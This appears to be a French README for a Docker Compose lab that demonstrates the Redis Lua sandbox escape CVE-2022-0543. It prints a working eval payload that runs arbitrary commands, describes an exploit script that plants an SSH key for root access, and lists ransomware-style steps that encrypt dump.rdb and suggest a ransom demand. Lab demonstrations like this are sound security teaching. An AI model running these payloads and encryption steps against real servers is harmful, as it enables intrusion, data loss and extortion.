# CVE-2022-0543
La démo utilise Docker Compose pour sa mise en place.

Dans le fichier docker-compose, il existe un conteneur appelé "redis-server" qui joue deux rôles : il lance le serveur Redis et un serveur SSH pour écouter les connexions SSH.

Ce conteneur représente une machine serveur locale ou dans un fournisseur de services cloud.

Pour exploiter cette faille, partons du fait que l'attaquant a accès au "redis-server" grâce à l'outil "redis-cli". En utilisant "redis-cli", nous pouvons exécuter des commandes sur la machine hôte en tant qu'utilisateur (Linux) ayant lancé le serveur Redis.

La faille nous donne un accès complet à la machine, mais pour des raisons de simplicité, la première manipulation sera d'obtenir un accès SSH à cette machine, même si techniquement cela ne serait pas nécessaire, car toutes les commandes pourraient être exécutées depuis "redis-cli" grâce au payload suivant :

``` shell
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("VOTRE COMMANDE"); local res = f:read("*a"); f:close(); return res' 0
```

# Dans un terminal
``` shell
docker-compose up
```


# Dans un autre terminal

``` shell
docker-compose run attacker
./exploit.sh
```
Le fichier `exploit.sh` va créer une clé SSH, mettre la clé publique dans le `redis-server` grâce à la faille et à `redis-cli`, puis se connecter via SSH.

Une fois cette commande exécutée, nous avons obtenu un accès SSH à la machine, et en plus de cela, nous sommes root car le serveur Redis a été lancé en tant que root. 
Nous pouvons examiner les processus en cours d'exécution en utilisant la commande `ps -ef`. Un attaquant pourrait, par exemple, chercher à effectuer un déni de service sur l'application en tuant le processus `redis-server`.

La manipulation que nous allons effectuer est similaire à celle d'un rançongiciel. Nous allons chiffrer la base de données. Une fois que nous avons accès à la machine, il faut se déplacer vers le dossier /var/lib/redis. Dans ce dossier, vous trouverez un fichier `dump.rdb`, qui représente les sauvegardes de Redis. Pour cette démo, nous avons utilisé des données exemples d'utilisateurs.

Nous allons maintenant chiffrer cette base de données.

``` shell
kill PROCESS_REDIS_SERVER # Arretons le processus redis-server. 
gpg -c dump.rdb # chiffront la base des donnees
# La commande crée un fichier dump.rdb.gpg
mv dump.rdb.gpg dump.rbd
redis-server & 
```

Lorsque vous relancez `redis-server`, vous verrez qu'un message d'erreur se produira lorsqu'il tentera de charger la base de données. Maintenant, il suffirait de demander une rançon par e-mail, par exemple.




